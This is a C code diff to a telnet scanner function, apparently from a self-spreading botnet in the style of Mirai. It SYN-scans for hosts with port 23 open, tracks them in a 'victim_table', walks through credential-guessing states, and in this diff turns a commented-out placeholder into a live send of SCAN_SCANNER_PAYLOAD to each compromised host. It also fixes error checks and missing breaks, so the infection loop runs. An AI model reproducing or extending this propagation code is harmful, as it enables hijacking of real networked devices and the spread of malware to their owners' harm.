@@ -226,9 +226,9 @@ bool scan_scanner(void)
 		goto end;
 	}
 
-	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) -1)
+	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1)
 	{
-		printd("Failed to open set nonblocking")
+		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno))
 		goto end;
 	}
 
@@ -293,7 +293,15 @@ bool scan_scanner(void)
 			// Check that it is a SYN ACK and if it matches our source port
 			if (rtcph->syn == 1 && rtcph->ack == 1 && rtcph->dest == LOCAL_PORT && rtcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
 			{
-				pktd(riph, rtcph) // Only in debug releases
+#ifdef DEBUG
+{
+				pktd(riph, rtcph)
+				char ipstr[INET_ADDRSTRLEN];
+				addr.sin_addr.s_addr = riph->saddr;
+				inet_ntop(AF_INET, &(addr.sin_addr), ipstr, INET_ADDRSTRLEN);
+				printd("Adding IP: %s", ipstr)
+}
+#endif
 				struct scan_victim *victim;
 				victim = &victim_table[i];
 				victim->ip = riph->saddr;
@@ -376,6 +384,7 @@ skip:
 	this means the next scan_readuntil will 100% fail! 
 	YAYYYYY
 */
+					break;
 				}
 				case PASSWORD:
 				{
@@ -403,10 +412,13 @@ skip:
 							break;
 					else
 						victim_table[i].state = PAYLOAD;
+					break;
 				}
 				case PAYLOAD:
 				{
-					// send(payload)
+					send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0);
+					victim_table[i].state = FINISHED;
+					break;
 				}
 				case FINISHED:
 				{
